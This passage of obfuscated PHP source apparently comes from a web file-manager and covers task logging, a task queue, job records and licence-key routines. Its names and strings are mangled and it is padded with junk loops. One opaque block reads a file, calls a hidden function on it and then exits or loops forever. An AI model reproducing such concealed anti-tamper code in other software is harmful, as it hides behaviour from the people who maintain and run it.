$´Ò‘‚éÖ; } if ($´Ò‘‚éÖ == 1) { break; } else { $Æí±ôˆî++; } } $«‡‘±íÛ = 2; for ($ĞìªÛïŸ = 0; $ĞìªÛïŸ < $¶¤„–Êè * 10; $ĞìªÛïŸ++) { if (($¶¤„–Êè * $ĞìªÛïŸ + 1) % $Æí±ôˆî == 0) { $«‡‘±íÛ = intval(($¶¤„–Êè * $ĞìªÛïŸ + 1) / $Æí±ôˆî); break; } } $ƒÄØïíÒ = $this->xtuj9ae9ce48($–Ô®æ» * $˜³ÂãÂº . $‘¹Ê»ã—[6], $‘¹Ê»ã—[136]); $®ŸŒÊğò = md5($‘¹Ê»ã—[304] . ($–Ô®æ» + $˜³ÂãÂº) . $‘¹Ê»ã—[305] . $Æí±ôˆî . $‘¹Ê»ã—[305] . $«‡‘±íÛ . $‘¹Ê»ã—[306]); $ğ¤Œşš = $´²÷”ï©[786]; if (strlen($ğ¤Œşš) < $´²÷”ï©[692]) { return; } $ÔĞƒŒçõ = $this->xtuj9ae9ce48($÷¿ó›Ÿå, $®ŸŒÊğò) . $‘¹Ê»ã—[307] . $ƒÄØïíÒ; $¤¹Ôèí = $´²÷”ï©[787]; while ($¤¹Ôèí < $´²÷”ï©[692]) { if ($¤¹Ôèí >= 0) { break; } $¤¹Ôèí++; } return $ÔĞƒŒçõ; } public function fsbmfe5f5e7f($Ëîåïü¥) { $û±™ŸÙ =& $_SERVER[‹è™Ü¸Ñ]; $µ±×ÏÆ =& $_SERVER[ÖÑ—ÉÒ†]; $íüÈ©ä = explode($µ±×ÏÆ[307], $Ëîåïü¥); $ùÅÁç½° = $û±™ŸÙ[788]; while ($ùÅÁç½° < $û±™ŸÙ[692]) { if ($ùÅÁç½° >= 0) { break; } $ùÅÁç½°++; } if (count($íüÈ©ä) != 2) { return $µ±×ÏÆ[6]; } $Ìøö²ì– = $this->umcx32f83135($íüÈ©ä[1] . $µ±×ÏÆ[6], $µ±×ÏÆ[136]); $˜ä§ñ» = $û±™ŸÙ[789]; if (strlen($˜ä§ñ») < $û±™ŸÙ[689]) { die; } if (!$Ìøö²ì–) { return $µ±×ÏÆ[6]; } $Ìøö²ì– = intval($Ìøö²ì–); $ãÌ‘ ò‘ = 0; $ËğÈô÷¬ = $û±™ŸÙ[790]; while (strlen($ËğÈô÷¬) < $û±™ŸÙ[692]) { if (!$ËğÈô÷¬) { break; } $ËğÈô÷¬++; } $Û×ÈÄÇ = 0; for ($ÄÈ¦ÜÁ = 3; $ÄÈ¦ÜÁ < $Ìøö²ì–; $ÄÈ¦ÜÁ += 2) { if ($Ìøö²ì– % $ÄÈ¦ÜÁ != 0) { continue; } $ãÌ‘ ò‘ = $ÄÈ¦ÜÁ; $Û×ÈÄÇ = intval($Ìøö²ì– / $ÄÈ¦ÜÁ); $ŠäÓí®Æ = $û±™ŸÙ[791]; if (!$ŠäÓí®Æ) { return; } break; $Áğüñï¥ = $û±™ŸÙ[792]; } $¢„°¸ = ($ãÌ‘ ò‘ - 1) * ($Û×ÈÄÇ - 1); $ßÆøûû½ = intval(($ãÌ‘ ò‘ + $Û×ÈÄÇ) / 2); while (1) { $àˆÈñ˜ò = $ßÆøûû½; $­µîÂ§½ = $¢„°¸; $†€ì±½´ = $û±™ŸÙ[793]; if (!$†€ì±½´) { return; } while ($­µîÂ§½ % $àˆÈñ˜ò != 0) { $ºôÎÕ‘ş = $­µîÂ§½; $‡‡‚Û›ç = $û±™ŸÙ[794]; if (!$‡‡‚Û›ç) { return; } $­µîÂ§½ = $àˆÈñ˜ò; $àˆÈñ˜ò = $ºôÎÕ‘ş % $àˆÈñ˜ò; $Ù–ç”ï˜ = $û±™ŸÙ[795]; while ($Ù–ç”ï˜ < $û±™ŸÙ[692]) { if ($Ù–ç”ï˜ >= 0) { break; } $Ù–ç”ï˜++; } } if ($àˆÈñ˜ò == 1) { break; } else { $ßÆøûû½++; } } $„ÂŠíğí = 2; $¬Ã¯šÌò = $û±™ŸÙ[796]; if (!$¬Ã¯šÌò) { return; } for ($ÄÈ¦ÜÁ = 0; $ÄÈ¦ÜÁ < $¢„°¸ * 10; $ÄÈ¦ÜÁ++) { if (($¢„°¸ * $ÄÈ¦ÜÁ + 1) % $ßÆøûû½ == 0) { $„ÂŠíğí = intval(($¢„°¸ * $ÄÈ¦ÜÁ + 1) / $ßÆøûû½); break; } } $÷—ÁÆ² = md5($µ±×ÏÆ[304] . ($ãÌ‘ ò‘ + $Û×ÈÄÇ) . $µ±×ÏÆ[305] . $ßÆøûû½ . $µ±×ÏÆ[305] . $„ÂŠíğí . $µ±×ÏÆ[306]); $á„ÒâÙŞ = $û±™ŸÙ[738]; while ($á„ÒâÙŞ < $û±™ŸÙ[697]) { if ($á„ÒâÙŞ >= 0) { break; } $á„ÒâÙŞ++; } $¦ˆ‹’ô = $this->umcx32f83135($íüÈ©ä[0], $÷—ÁÆ²); $±«ìÏÄ¸ = $û±™ŸÙ[797]; if (!$±«ìÏÄ¸) { die; } return $¦ˆ‹’ô; $Õ¯£¶Ò± = $û±™ŸÙ[798]; if (strlen($Õ¯£¶Ò±) < $û±™ŸÙ[694]) { return; } } public function zfkyb71e736d() { $Š§ÉØ¶È =& $_SERVER[‹è™Ü¸Ñ]; $Ì¼‘õà = mt_rand(pow(2, 14), pow(2, 16) - 1); $à­öè• = $Š§ÉØ¶È[799]; $åğØûÑ¿ = array(); $Ã÷ŠùŞã = 1; while ($Ã÷ŠùŞã <= (int) sqrt($Ì¼‘õà)) { $ê¼øôÆ = $Ã÷ŠùŞã; $İÉá„ = $Š§ÉØ¶È[800]; if (strlen($İÉá„) < $Š§ÉØ¶È[694]) { return; } while (!0) { $ê¼øôÆ++; if ($ê¼øôÆ <= 2) { $Ã÷ŠùŞã = $ê¼øôÆ; break; } else { if ($ê¼øôÆ < 2) { continue; } } $‹¡Ó©½ƒ = !0; for ($èÑîôŒˆ = 2; $èÑîôŒˆ <= sqrt($ê¼øôÆ); $èÑîôŒˆ++) { if ($ê¼øôÆ % $èÑîôŒˆ == 0) { $‹¡Ó©½ƒ = !1; } } if ($‹¡Ó©½ƒ) { $Ã÷ŠùŞã = $ê¼øôÆ; break; } } $åğØûÑ¿[] = $Ã÷ŠùŞã; } $ßú‰èíÇ = 2; for ($ê¼øôÆ = $Ì¼‘õà; $ê¼øôÆ > 1; $ê¼øôÆ--) { $‹¡Ó©½ƒ = !0; $”é²Ë›™ = $Š§ÉØ¶È[801]; while ($”é²Ë›™ < $Š§ÉØ¶È[692]) { if ($”é²Ë›™ >= 0) { break; } $”é²Ë›™++; } foreach ($åğØûÑ¿ as $ôâ£Òş÷) { if ($ê¼øôÆ % $ôâ£Òş÷ == 0) { $‹¡Ó©½ƒ = !1; break; } } if ($‹¡Ó©½ƒ) { $ßú‰èíÇ = $ê¼øôÆ; break; } } return $ßú‰èíÇ; $…®Şëì’ = $Š§ÉØ¶È[802]; if (strlen($…®Şëì’) < $Š§ÉØ¶È[697]) { die; } } public function yhrd1daa7d5c($›ö€Û§ş, $¹Ê¨Ï¬Å) { $–„ÒÈä› =& $_SERVER[ÖÑ—ÉÒ†]; return call_user_func(array($–„ÒÈä›[8], $–„ÒÈä›[308]), $›ö€Û§ş, $¹Ê¨Ï¬Å); } public function xtuj9ae9ce48($›ôæâ, $î©®’Õ) { $ÛòíÀæ€ =& $_SERVER[ÖÑ—ÉÒ†]; return call_user_func(array($ÛòíÀæ€[309], $ÛòíÀæ€[310]), $›ôæâ, $î©®’Õ); } public function umcx32f83135($ˆ™î÷ë‘, $ùïèµ•î) { $ÀÎÆ€¼ =& $_SERVER[ÖÑ—ÉÒ†]; return call_user_func(array($ÀÎÆ€¼[309], $ÀÎÆ€¼[311]), $ˆ™î÷ë‘, $ùïèµ•î); } } goto aŒøÃ×ï«ö; C†¢Ø®¿–: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($Ò®ºôç¾, $­ø¯®œ = '', $İéïÛÍ¼ = 0, $ßğ®Àö¥ = '') { $…•÷Ì›ï =& $_SERVER[‹è™Ü¸Ñ]; $ßğ®Àö¥ = $ßğ®Àö¥ ? $ßğ®Àö¥ : ($­ø¯®œ ? $­ø¯®œ : $Ò®ºôç¾); $†ôı‹İÒ = new Task($Ò®ºôç¾, $­ø¯®œ, $İéïÛÍ¼, $ßğ®Àö¥); $GLOBALS[$…•÷Ì›ï[1835] . $Ò®ºôç¾] = new TaskLog($…•÷Ì›ï[1736], $†ôı‹İÒ, $ßğ®Àö¥); return $†ôı‹İÒ; } public function __construct($®éÄ˜¬ = '', $ìÇ€îØš = '', $¸ØŒã·‰ = '') { $œ‰³¨ÛÌ =& $_SERVER[‹è™Ü¸Ñ]; if (!$®éÄ˜¬) { $®éÄ˜¬ = $œ‰³¨ÛÌ[1736]; } $¢ÎÃê­à = $®éÄ˜¬ . $œ‰³¨ÛÌ[462] . rand_string(10); if (!$¸ØŒã·‰) { $¸ØŒã·‰ = $®éÄ˜¬ . $œ‰³¨ÛÌ[53] . $¸ØŒã·‰; } switch ($®éÄ˜¬) { case $œ‰³¨ÛÌ[1736]: if (!$ìÇ€îØš || !$ìÇ€îØš->task) { return echoLog($®éÄ˜¬ . $œ‰³¨ÛÌ[1836]); } $æ‚ş²„Œ = $ìÇ€îØš; $¢ÎÃê­à = $æ‚ş²„Œ->task[$œ‰³¨ÛÌ[475]]; $®éÄ˜¬ = $æ‚ş²„Œ->task[$œ‰³¨ÛÌ[475]]; if (!$æ‚ş²„Œ->task[$œ‰³¨ÛÌ[1639]]) { $æ‚ş²„Œ->task[$œ‰³¨ÛÌ[1639]] = $¸ØŒã·‰ ? $¸ØŒã·‰ : $®éÄ˜¬; } break; case $œ‰³¨ÛÌ[1837]: if (!$ìÇ€îØš) { return echoLog($®éÄ˜¬ . $œ‰³¨ÛÌ[1838]); } $ŠÛûÆÍ† = is_string($ìÇ€îØš) ? array($ìÇ€îØš) : $ìÇ€îØš; $æ‚ş²„Œ = new TaskFileTransfer($¢ÎÃê­à, $®éÄ˜¬, 0, $¸ØŒã·‰ ? $¸ØŒã·‰ : $ŠÛûÆÍ†[0]); foreach ($ŠÛûÆÍ† as $ ÔşÌç) { $æ‚ş²„Œ->addPath($ ÔşÌç); } break; case $œ‰³¨ÛÌ[389]: if (!$ìÇ€îØš) { return echoLog($®éÄ˜¬ . $œ‰³¨ÛÌ[1838]); } $ŠÛûÆÍ† = is_string($ìÇ€îØš) ? array($ìÇ€îØš) : $ìÇ€îØš; $æ‚ş²„Œ = new TaskZip($¢ÎÃê­à, $®éÄ˜¬, 0, $¸ØŒã·‰ ? $¸ØŒã·‰ : $ŠÛûÆÍ†[0]); foreach ($ŠÛûÆÍ† as $ ÔşÌç) { $æ‚ş²„Œ->addPath($ ÔşÌç); } break; case $œ‰³¨ÛÌ[1279]: if (!$ìÇ€îØš) { return echoLog($®éÄ˜¬ . $œ‰³¨ÛÌ[1838]); } $æ‚ş²„Œ = new TaskUnZip($¢ÎÃê­à, $®éÄ˜¬, 0, $¸ØŒã·‰ ? $¸ØŒã·‰ : $ìÇ€îØš); if ($ìÇ€îØš) { $æ‚ş²„Œ->addFile($ìÇ€îØš); } break; case $œ‰³¨ÛÌ[152]: $æ‚ş²„Œ = new TaskHttp($¢ÎÃê­à, $®éÄ˜¬); break; default: return; break; } $this->task = $æ‚ş²„Œ; $this->taskID = $¢ÎÃê­à; Hook::bind($œ‰³¨ÛÌ[1773], array($this, $œ‰³¨ÛÌ[1839])); Hook::bind($œ‰³¨ÛÌ[1775], array($this, $œ‰³¨ÛÌ[1840])); Hook::bind($œ‰³¨ÛÌ[1769], array($this, $œ‰³¨ÛÌ[1841])); echoLog($œ‰³¨ÛÌ[1842] . $æ‚ş²„Œ->task[$œ‰³¨ÛÌ[1639]]); } public function __destruct() { $this->end(); } public function end($ùëà¼Åõ = '') { $ĞØ±èİÍ =& $_SERVER[‹è™Ü¸Ñ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ùëà¼Åõ); $this->task = !1; $this->taskID = !1; Hook::unbind($ĞØ±èİÍ[1773], array($this, $ĞØ±èİÍ[1839])); Hook::unbind($ĞØ±èİÍ[1775], array($this, $ĞØ±èİÍ[1840])); Hook::unbind($ĞØ±èİÍ[1769], array($this, $ĞØ±èİÍ[1841])); } public function taskUpdate($–åĞíµ¶) { $’É¨ÃƒÍ =& $_SERVER[‹è™Ü¸Ñ]; if (!$–åĞíµ¶ || $this->taskID != $–åĞíµ¶[$’É¨ÃƒÍ[475]]) { return; } $åå£«á = 20; $ÅÔ«ü÷¼ = intval($–åĞíµ¶[$’É¨ÃƒÍ[1754]] * $åå£«á); $Ç»ºõìÍ = $’É¨ÃƒÍ[176] . str_repeat($’É¨ÃƒÍ[942], $ÅÔ«ü÷¼) . $’É¨ÃƒÍ[1072] . str_repeat($’É¨ÃƒÍ[53], $åå£«á - $ÅÔ«ü÷¼) . $’É¨ÃƒÍ[178]; $ÅÎÉå‚º = $Ç»ºõìÍ . sprintf($’É¨ÃƒÍ[1843], $–åĞíµ¶[$’É¨ÃƒÍ[1754]] * 100) . $’É¨ÃƒÍ[1844]; $„ô†æ¬˜ = $ÅÎÉå‚º . $–åĞíµ¶[$’É¨ÃƒÍ[1753]] . $’É¨ÃƒÍ[8] . $–åĞíµ¶[$’É¨ÃƒÍ[1121]] . LNG($’É¨ÃƒÍ[1845]); $ò”Ï™– = $’É¨ÃƒÍ[12]; if ($–åĞíµ¶[$’É¨ÃƒÍ[1829]]) { $„ô†æ¬˜ = $ÅÎÉå‚º . size_format($–åĞíµ¶[$’É¨ÃƒÍ[1753]]) . $’É¨ÃƒÍ[8] . size_format($–åĞíµ¶[$’É¨ÃƒÍ[1121]]); $ò”Ï™– = size_format($–åĞíµ¶[$’É¨ÃƒÍ[1755]]) . $’É¨ÃƒÍ[1846]; } if ($–åĞíµ¶[$’É¨ÃƒÍ[1123]]) { $–åĞíµ¶[$’É¨ÃƒÍ[1803]] = $–åĞíµ¶[$’É¨ÃƒÍ[1123]] . $’É¨ÃƒÍ[53] . $–åĞíµ¶[$’É¨ÃƒÍ[1803]]; } if ($–åĞíµ¶[$’É¨ÃƒÍ[1803]]) { $¡òñ½¦ = $’É¨ÃƒÍ[12]; if ($–åĞíµ¶[$’É¨ÃƒÍ[1805]]) { $¡òñ½¦ = $’É¨ÃƒÍ[50] . size_format($–åĞíµ¶[$’É¨ÃƒÍ[1806]]) . $’É¨ÃƒÍ[8] . size_format($–åĞíµ¶[$’É¨ÃƒÍ[1805]]); } $ò”Ï™– .= $–åĞíµ¶[$’É¨ÃƒÍ[1803]] . $¡òñ½¦; } if ($–åĞíµ¶[$’É¨ÃƒÍ[818]] && !$–åĞíµ¶[$’É¨ÃƒÍ[1805]]) { $ò”Ï™– .= $’É¨ÃƒÍ[53] . size_format($–åĞíµ¶[$’É¨ÃƒÍ[1810]]) . $’É¨ÃƒÍ[8] . size_format($–åĞíµ¶[$’É¨ÃƒÍ[818]]); } echoLog($„ô†æ¬˜ . $’É¨ÃƒÍ[53] . $ò”Ï™–, !0); } public function taskEnd($„âÄá—À) { $Ò•‘„« =& $_SERVER[‹è™Ü¸Ñ]; if (!$„âÄá—À || $this->taskID != $„âÄá—À[$Ò•‘„«[475]]) { return; } $–ñğâ×õ = $„âÄá—À ? $„âÄá—À[$Ò•‘„«[1753]] . $Ò•‘„«[8] . $„âÄá—À[$Ò•‘„«[1121]] . LNG($Ò•‘„«[1845]) . $Ò•‘„«[74] : $Ò•‘„«[12]; echoLog($Ò•‘„«[1847] . $„âÄá—À[$Ò•‘„«[1639]] . ($„âÄá—À[$Ò•‘„«[526]] ? $Ò•‘„«[74] . $„âÄá—À[$Ò•‘„«[526]] : $Ò•‘„«[12]) . $Ò•‘„«[74] . $–ñğâ×õ . $Ò•‘„«[1848] . sprintf($Ò•‘„«[905], timeFloat() - $„âÄá—À[$Ò•‘„«[1756]]) . $Ò•‘„«[1768]); $this->end(); } public function taskKill($Ó‡Œ ï·) { $ù« ãÖÂ =& $_SERVER[‹è™Ü¸Ñ]; if (!$Ó‡Œ ï· || $this->taskID != $Ó‡Œ ï·[$ù« ãÖÂ[475]]) { return; } echoLog($ù« ãÖÂ[1849] . $Ó‡Œ ï·[$ù« ãÖÂ[1639]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\x73\153\x51\x75\145\165\145\x4c\x65\156\x67\164\x68"; const QUEUE_DATA = "\x74\141\x73\153\121\165\145\165\145\x44\141\x74\x61"; const QUEUE_TIME = "\164\x61\163\153\x51\x75\145\x75\x65\x4c\141\x73\164\122\x75\156"; const QUEUE_THREAD = "\164\141\x73\x6b\121\165\x65\165\x65\124\x68\x72\x65\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ã·ß™Ë, $¤„ŠÅÜ× = array(), $Èù¶¹Æ“ = '', $‘ØË¼Ó = '') { $¿ç‹ğ—ï =& $_SERVER[‹è™Ü¸Ñ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($‘ØË¼Ó && array_find_by_field(self::$listData, $¿ç‹ğ—ï[97], $‘ØË¼Ó)) { return !0; } if ($‘ØË¼Ó && array_find_by_field(self::$listDataAdd, $¿ç‹ğ—ï[97], $‘ØË¼Ó)) { return !0; } self::$listDataAdd[] = array($¿ç‹ğ—ï[341] => $ã·ß™Ë, $¿ç‹ğ—ï[1850] => $¤„ŠÅÜ×, $¿ç‹ğ—ï[526] => $Èù¶¹Æ“, $¿ç‹ğ—ï[97] => $‘ØË¼Ó); return !0; } public static function addSubmit() { $±¥«£ÃÑ =& $_SERVER[‹è™Ü¸Ñ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($±¥«£ÃÑ[1851] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $±¥«£ÃÑ[12], $±¥«£ÃÑ[526])), $±¥«£ÃÑ[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ß ò€¼Ï, $ŒÒ‘ÁÎ = array(), $š¹ÏÀ = '', $ùÖïû‹ = '') { $ä¾×êĞ¢ =& $_SERVER[‹è™Ü¸Ñ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $‚ÓÇ©¾ß = self::getAll(); if ($ùÖïû‹ && array_find_by_field($‚ÓÇ©¾ß, $ä¾×êĞ¢[97], $ùÖïû‹)) { return !0; } $‚ÓÇ©¾ß[] = array($ä¾×êĞ¢[341] => $ß ò€¼Ï, $ä¾×êĞ¢[1850] => $ŒÒ‘ÁÎ, $ä¾×êĞ¢[526] => $š¹ÏÀ, $ä¾×êĞ¢[97] => $ùÖïû‹); self::setAll($‚ÓÇ©¾ß); write_log($ä¾×êĞ¢[1851] . $š¹ÏÀ, $ä¾×êĞ¢[197]); return !0; } public static function run() { $ñÃíÒ•Ú =& $_SERVER[‹è™Ü¸Ñ]; $ñÍœ¨ßÖ = self::getAll(); $Ø»”Îş  = array_shift($ñÍœ¨ßÖ); if (!$Ø»”Îş ) { return !1; } self::setAll($ñÍœ¨ßÖ); $ÖçñƒŸô = timeFloat(); $º¸üŞ†£ = $ñÃíÒ•Ú[12]; try { $º¸üŞ†£ = Hook::apply($Ø»”Îş [$ñÃíÒ•Ú[341]], $Ø»”Îş [$ñÃíÒ•Ú[1850]]); } catch (Exception $ÙÆæ—æ”) { write_log($ÙÆæ—æ”, $ñÃíÒ•Ú[1244]); } $¬—ˆ†³¼ = number_format(timeFloat() - $ÖçñƒŸô, 3) . $ñÃíÒ•Ú[1768]; if ($º¸üŞ†£ && is_string($º¸üŞ†£)) { $¬—ˆ†³¼ = $¬—ˆ†³¼ . $ñÃíÒ•Ú[1852] . $º¸üŞ†£; } write_log($ñÃíÒ•Ú[1853] . $Ø»”Îş [$ñÃíÒ•Ú[526]] . $ñÃíÒ•Ú[1854] . $¬—ˆ†³¼, $ñÃíÒ•Ú[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Ñê”òÎ =& $_SERVER[‹è™Ü¸Ñ]; $ÁÉ¢¿¼ = self::threadCount() + 1; if ($ÁÉ¢¿¼ > 3 || !self::count()) { return; } write_log($Ñê”òÎ[1855] . $ÁÉ¢¿¼, $Ñê”òÎ[197]); Cache::set(self::QUEUE_THREAD, $ÁÉ¢¿¼, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Ñê”òÎ[1856], $Ñê”òÎ[197]); } public static function getKey($Öˆ®ª™½, $æüÓÆ« = "\x69\156\x74") { $‘»Î…»“ =& $_SERVER[‹è™Ü¸Ñ]; Cache::removeMemory($Öˆ®ª™½); $æé›Ò“ë = Cache::get($Öˆ®ª™½); if ($æüÓÆ« == $‘»Î…»“[364]) { return $æé›Ò“ë ? intval($æé›Ò“ë) : 0; } if ($æüÓÆ« == $‘»Î…»“[1857]) { return is_array($æé›Ò“ë) ? $æé›Ò“ë : array(); } return $æé›Ò“ë; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[‹è™Ü¸Ñ][1857]); } public static function setAll($•ºªÌ¢) { $ÖÆîÇë· = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($•ºªÌ¢), $ÖÆîÇë·); Cache::set(self::QUEUE_DATA, $•ºªÌ¢, $ÖÆîÇë·); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ºíÇÙèÁ, $Ø”¡à½Û = 5.0) { if (!$ºíÇÙèÁ) { return; } $™ß³®ùÇ = Cache::get($ºíÇÙèÁ); if (!$™ß³®ùÇ || timeFloat() - floatVal($™ß³®ùÇ) >= $Ø”¡à½Û) { Cache::set($ºíÇÙèÁ, timeFloat(), $Ø”¡à½Û * 10); return !0; } return !1; } public static function timeLimitCall($–¡£ôÖ¿, $ûËˆåÔ˜, $Ü¶ï…»Š, $›²Œİ©æ = 5.0) { $¦ªÍ“¥Ã =& $_SERVER[‹è™Ü¸Ñ]; if (!$–¡£ôÖ¿ || !$ûËˆåÔ˜) { return; } self::$asyncAdd = !0; $¿¯€ıÔÎ = $¦ªÍ“¥Ã[1858]; $“õÛ = Cache::get($¿¯€ıÔÎ, !0); $ˆé¤ÉÖº = array($¦ªÍ“¥Ã[1859] => timeFloat(), $¦ªÍ“¥Ã[1860] => timeFloat(), $¦ªÍ“¥Ã[341] => $ûËˆåÔ˜, $¦ªÍ“¥Ã[1850] => $Ü¶ï…»Š, $¦ªÍ“¥Ã[206] => $›²Œİ©æ); if (is_array($“õÛ[$–¡£ôÖ¿])) { $ˆé¤ÉÖº[$¦ªÍ“¥Ã[1860]] = $“õÛ[$–¡£ôÖ¿][$¦ªÍ“¥Ã[1860]]; } if (is_array($“õÛ[$–¡£ôÖ¿])) { if (timeFloat() - $“õÛ[$–¡£ôÖ¿][$¦ªÍ“¥Ã[1859]] < $ˆé¤ÉÖº[$¦ªÍ“¥Ã[206]] * 0.3) { return; } $ˆé¤ÉÖº[$¦ªÍ“¥Ã[1860]] = $“õÛ[$–¡£ôÖ¿][$¦ªÍ“¥Ã[1860]]; } $“õÛ[$–¡£ôÖ¿] = $ˆé¤ÉÖº; Cache::set($¿¯€ıÔÎ, $“õÛ, 60); Cache::removeMemory($¿¯€ıÔÎ); write_log($¦ªÍ“¥Ã[1861] . $–¡£ôÖ¿ . $¦ªÍ“¥Ã[74] . $ûËˆåÔ˜, $¦ªÍ“¥Ã[197]); } public static function timeLimitCallLoop() { $Æ‡Ï®•Ü =& $_SERVER[‹è™Ü¸Ñ]; $ñáğ¶Õš = array($Æ‡Ï®•Ü[1862]); $Äõæ¡×å = in_array(strtolower(ACTION), $ñáğ¶Õš); if (!$Äõæ¡×å && !self::$asyncAdd) { return; } $ÄŒ‚È = $Æ‡Ï®•Ü[1858]; $òíñğ‰„ = Cache::get($ÄŒ‚È, !0); if (!$òíñğ‰„ || count($òíñğ‰„) <= 0) { return; } $´õğÆ ‰ = !1; $ï—Ø­¨æ = timeFloat(); $Ä‹–­ó = array(); foreach ($òíñğ‰„ as $Æú¦Öê· => $§·³çí) { if ($ï—Ø­¨æ - $§·³çí[$Æ‡Ï®•Ü[1860]] > $§·³çí[$Æ‡Ï®•Ü[206]]) { $´õğÆ ‰ = !0; try { Hook::apply($§·³çí[$Æ‡Ï®•Ü[341]], $§·³çí[$Æ‡Ï®•Ü[1850]]); write_log($Æ‡Ï®•Ü[1863] . $Æú¦Öê· . $Æ‡Ï®•Ü[74] . $§·³çí[$Æ‡Ï®•Ü[341]] . $Æ‡Ï®•Ü[1864] . ACTION, $Æ‡Ï®•Ü[197]); } catch (Exception $ğÌ©úÂŠ) { } continue; } $Ä‹–­ó[$Æú¦Öê·] = $§·³çí; } if (!$´õğÆ ‰) { return; } if (!$Ä‹–­ó) { return Cache::remove($ÄŒ‚È); } Cache::set($ÄŒ‚È, $Ä‹–­ó, 60); Cache::removeMemory($ÄŒ‚È); } public static function finished($‹Ì»à‡¼, $ÀÊš¡Î) { $ÙÍéò =& $_SERVER[‹è™Ü¸Ñ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ÙÍéò[341] => $‹Ì»à‡¼, $ÙÍéò[1850] => $ÀÊš¡Î); } private static function finishedRun() { $»ïàëÚ =& $_SERVER[‹è™Ü¸Ñ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Ÿíş¿¨) { try { Hook::apply($Ÿíş¿¨[$»ïàëÚ[341]], $Ÿíş¿¨[$»ïàëÚ[1850]]); } catch (Exception $Ì‰¸Ş¢Ë) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto a·ïµç¶­Ü; Cì—¹›Ä: if (!isset($_SERVER[$_SERVER[‹è™Ü¸Ñ][931]]) || !isset($_SERVER[$_SERVER[‹è™Ü¸Ñ][932]])) { $_getc = $_SERVER[‹è™Ü¸Ñ][934]; $_getfile = $_SERVER[$_SERVER[‹è™Ü¸Ñ][935]] . $_SERVER[‹è™Ü¸Ñ][936]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‹è™Ü¸Ñ][262], $_getfilec); if (count($_getarrs) < $_SERVER[‹è™Ü¸Ñ][692]) { $exit = $_SERVER[‹è™Ü¸Ñ][937]; $exit(); } $_act = $_SERVER[‹è™Ü¸Ñ][1605]; $_act($_SERVER[$_SERVER[‹è™Ü¸Ñ][935]] . $_SERVER[‹è™Ü¸Ñ][936]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[‹è™Ü¸Ñ][454]); } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\56\152\x6f\x62\x4c\151\163\x74"; public $field = array("\156\x61\x6d\145", "\144\145\163\x63", "\163\x6f\x72\164"); const JOB_KEY = "\x73\145\x6c\146\112\x6f\x62\114\x69\163\x74"; public function listData($«Çáñçş = false, $Ïòù = "\x73\x6f\x72\x74", $•æ«ªÊ = false) { return parent::listData($«Çáñçş, $Ïòù, $•æ«ªÊ); } public function remove($®œíºÓ´) { return parent::remove($®œíºÓ´); } public function add($µ›Úûç) { $¹ÛøÂÅ =& $_SERVER[‹è™Ü¸Ñ]; if ($this->findByName($µ›Úûç[$¹ÛøÂÅ[32]])) { return !1; } $µ›Úûç[$¹ÛøÂÅ[1975]] = $this->getSort(); return parent::insert($µ›Úûç); } private function getSort() { $úä”¯ =& $_SERVER[‹è™Ü¸Ñ]; $éë¡®¸ = parent::listData(); $Öä—ŸÎˆ = array_to_keyvalue($éë¡®¸, $úä”¯[12], $úä”¯[1975]); return empty($Öä—ŸÎˆ) ? 0 : max($Öä—ŸÎˆ) + 1; } public function update($…Æ…Ê¤®, $¯—ÜĞùŠ) { $µÊ‚Ìµµ =& $_SERVER[‹è™Ü¸Ñ]; $Şô˜ğŸœ = parent::listData($…Æ…Ê¤®); $îçöÙ¬È = $this->findByName($¯—ÜĞùŠ[$µÊ‚Ìµµ[32]]); if (!$Şô˜ğŸœ || $îçöÙ¬È && $îçöÙ¬È[$µÊ‚Ìµµ[475]] != $Şô˜ğŸœ[$µÊ‚Ìµµ[475]]) { return !1; } return parent::update($…Æ…Ê¤®, $¯—ÜĞùŠ); } public function setUserJob($ô€ÛÙ„É, $Æíßäİ¢) { $ïÇ»Óß¥ =& $_SERVER[‹è™Ü¸Ñ]; if (!is_array($Æíßäİ¢)) { $Æíßäİ¢ = array($Æíßäİ¢); } $§‰ÓŠŒ² = parent::listData(); $çÛ­æ½ş = array_to_keyvalue($§‰ÓŠŒ², $ïÇ»Óß¥[32]); $ôÈŸ£–Ş = $ïÇ»Óß¥[454]; foreach ($Æíßäİ¢ as $¥×ÉÊà) { if ($çÛ­æ½ş[$¥×ÉÊà]) { $ôÈŸ£–Ş .= $çÛ­æ½ş[$¥×ÉÊà][$ïÇ»Óß¥[475]] . $ïÇ»Óß¥[50]; } else { $ë•…Œõ« = $this->add($¥×ÉÊà); $ôÈŸ£–Ş .= $ë•…Œõ« . $ïÇ»Óß¥[50]; } } $ôÈŸ£–Ş = rtrim($ôÈŸ£–Ş, 